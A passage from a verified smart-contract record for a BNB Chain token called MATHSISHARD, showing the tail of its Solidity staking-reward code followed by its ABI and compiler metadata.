{\r\n        if (amount == 0) return;\r\n        require(amount<=getStakeBalance(addr, main),\"Exceeds stake balance\");\r\n\r\n        if (_excludedFromStaking.contains(addr)){\r\n            if (main) \r\n                toBePaidMain[addr] -= amount; \r\n            else \r\n                toBePaidMisc[addr] -= amount;\r\n        }\r\n        else{\r\n            uint256 newAmount  =newStakeOf(addr, main);            \r\n            if (main) {\r\n                alreadyPaidMain[addr] = mainRewardShare * _balances[addr];\r\n                toBePaidMain[addr] += newAmount;\r\n                toBePaidMain[addr] -= amount;                \r\n            }\r\n            else {\r\n                alreadyPaidMisc[addr] = miscRewardShare * _balances[addr];\r\n                toBePaidMisc[addr] += newAmount;\r\n                toBePaidMisc[addr] -= amount;\r\n            }\r\n        }\r\n    }   \r\n    function getStakeBalance(address addr, bool main) private view returns (uint256) {\r\n        if (main){\r\n            if (isExcludedFromStaking(addr)) \r\n                return toBePaidMain[addr];\r\n            return newStakeOf(addr, true) + toBePaidMain[addr];\r\n        } else{\r\n            if (isExcludedFromStaking(addr)) \r\n                return toBePaidMisc[addr];\r\n            return newStakeOf(addr, false) + toBePaidMisc[addr];            \r\n        }\r\n    }\r\n    \r\n    function getTotalShares() private view returns (uint256) {\r\n        return _totalShares - INITIAL_SUPPLY;\r\n    }\r\n\r\n     function setUnlockTime(uint256 newUnlockTime) private{\r\n        // require new unlock time to be longer than old one\r\n        require(newUnlockTime > _liquidityUnlockTime);\r\n        _liquidityUnlockTime = newUnlockTime;\r\n    }\r\n\r\n    function newStakeOf(address staker, bool main) private view returns (uint256) {\r\n        if (main){\r\n            uint256 fullPayout = mainRewardShare * _balances[staker];\r\n            if (fullPayout < alreadyPaidMain[staker]) \r\n                return 0;\r\n            return (fullPayout-alreadyPaidMain[staker]) / DISTRIBUTION_MULTI;\r\n        }  \r\n        else {\r\n            uint256 fullPayout = miscRewardShare * _balances[staker];\r\n            if (fullPayout < alreadyPaidMisc[staker]) \r\n                return 0;\r\n            return (fullPayout-alreadyPaidMisc[staker]) / DISTRIBUTION_MULTI;\r\n        }        \r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"AccountExcluded\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"burn\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"limits\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"liquidity\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"sells\",\"type\":\"bool\"}],\"name\":\"AdjustedDynamicSettings\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"newMainReward\",\"type\":\"address\"}],\"name\":\"ChangeMainReward\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"ClaimBNB\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"}],\"name\":\"ClaimToken\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"EnableBlacklist\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"EnableManualSwap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"ExcludeFromStaking\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"exclude\",\"type\":\"bool\"}],\"name\":\"ExcludedAccountFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"extendedLockTime\",\"type\":\"uint256\"}],\"name\":\"ExtendLiquidityLock\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"IncludeToStaking\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"newBurn\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"newBuyback\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"newDev\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"newLiquidity\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"newLottery\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"newMarketing\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"newRewards\",\"type\":\"uint8\"}],\"name\":\"RatiosChanges\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"newDevWallet\",\"type\":\"address\"}],\"name\":\"UpdateDevWallet\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"newLotteryWallet\",\"type\":\"address\"}],\"name\":\"UpdateLotteryWallet\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"newMarketingWallet\",\"type\":\"address\"}],\"name\":\"UpdateMarketingWallet\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"newMainSplit\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"newMiscSplit\",\"type\":\"uint8\"}],\"name\":\"UpdateRewardSplit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"newThreshold\",\"type\":\"uint16\"}],\"name\":\"UpdateSwapThreshold\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"target\",\"type\":\"uint16\"}],\"name\":\"UpdateTargetLiquidity\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"buyTax\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"sellTax\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"transferTax\",\"type\":\"uint8\"}],\"name\":\"UpdateTaxes\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"BurnTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ClaimMainReward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"ClaimMiscReward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"IncludeMeToStaking\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MAX_TAX\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"PancakeRouter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_limits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"maxWallet\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxSell\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"maxBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint16\",\"name\":\"maxWalletRatio\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"maxSellRatio\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"maxBuyRatio\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"divisor\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_pancakePairAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxRates\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"buyTax\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"sellTax\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"transferTax\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxRatios\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"burn\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"buyback\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"dev\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"liquidity\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"lottery\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"marketing\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"rewards\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"dev\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"lottery\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketing\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"accountTotalClaimed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"winner\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"awardLottery\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newReward\",\"type\":\"address\"}],\"name\":\"changeMainReward\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"permilleOfPancake\",\"type\":\"uint16\"},{\"internalType\":\"bool\",\"name\":\"ignoreLimits\",\"type\":\"bool\"}],\"name\":\"createLPandBNB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"burn\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"limits\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"liquidity\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"sells\",\"type\":\"bool\"}],\"name\":\"dynamicSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"enableBlacklist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"enableManualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exclude\",\"type\":\"bool\"}],\"name\":\"excludeAccountFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"excludeFromStaking\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBlacklistInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_liquidityBlock\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"_blacklistBlocks\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"_snipersRekt\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"_blacklistEnabled\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"_revertSameBlock\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getDynamicInfo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"_dynamicBurn\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"_dynamicLimits\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"_dynamicLiquidity\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"_dynamicSells\",\"type\":\"bool\"},{\"internalType\":\"uint16\",\"name\":\"_targetLiquidity\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getLiquidityRatio\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getLiquidityUnlockInSeconds\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"getMainBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"getMiscBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getSupplyInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"initialSupply\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"circulatingSupply\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"burntTokens\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getWithdrawBalances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"buyback\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"dev\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lottery\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"marketing\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"includeToStaking\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isBlacklisted\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"isExcludedFromStaking\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"lockTimeInSeconds\",\"type\":\"uint256\"}],\"name\":\"lockLiquidityTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mainReward\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"recoverBNB\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAddress\",\"type\":\"address\"}],\"name\":\"recoverMiscToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"releaseLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"sameBlockRevert\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setBlacklistStatus\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setDevWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setLotteryWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setMarketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"presaleAddress\",\"type\":\"address\"}],\"name\":\"setPresale\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapThreshold\",\"outputs\":[{\"internalType\":\"uint16\",\"name\":\"\",\"type\":\"uint16\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalPayouts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalRewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"triggerBuyback\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"triggerExternalBuyback\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"newMaxWalletRatio\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"newMaxSellRatio\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"newMaxBuyRatio\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"newDivisor\",\"type\":\"uint16\"},{\"internalType\":\"bool\",\"name\":\"ofCurrentSupply\",\"type\":\"bool\"}],\"name\":\"updateLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"newBurn\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newBuyback\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newDev\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newLiquidity\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newLottery\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newMarketing\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newRewards\",\"type\":\"uint8\"}],\"name\":\"updateRatios\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"mainSplit\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"miscSplit\",\"type\":\"uint8\"}],\"name\":\"updateRewardSplit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"threshold\",\"type\":\"uint16\"}],\"name\":\"updateSwapThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"target\",\"type\":\"uint16\"}],\"name\":\"updateTargetLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"newBuy\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newSell\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"newTransfer\",\"type\":\"uint8\"}],\"name\":\"updateTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"newName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"newSymbol\",\"type\":\"string\"}],\"name\":\"updateTokenDetails\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawDev\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawLottery\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "MATHSISHARD", "CompilerVersion": "v0.8.11+commit.d7f03943", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f7e7584a9dc8e8982bc2b0013e0c85ea3b71840945b5819b566ce96cc3ace95a"}